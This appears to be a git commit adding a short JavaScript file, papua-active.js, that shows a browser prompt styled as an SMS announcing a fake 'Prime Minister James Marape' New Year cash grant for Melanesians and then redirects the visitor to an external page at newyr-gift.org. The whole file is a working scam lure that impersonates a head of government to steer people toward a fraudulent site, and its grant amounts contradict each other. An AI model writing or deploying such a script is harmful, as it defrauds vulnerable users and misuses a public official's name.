add1f00ebc9ec8c60cf98ba865ede4e530a787bd
ukebeblog <esther001imoh@gmail.com>
2025-01-03 08:50:38 +0100

    Create papua-active.js

---
+++ papua-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW PGK150,000'
+password=prompt('SMS: Congratulations You are qualify for Prime Minister JAMES MARAPE PGK55,000 NEW YEAR CASH GRANT FOR MELANESIANS, Kindly Press OK to Withdraw Cash   ','WITHDRAW PGK150,000');
+if (password != 'WITHDRAW PGK150,000') {
+location.href='https://newyr-gift.org/newyr-papua-grant.html';
+}
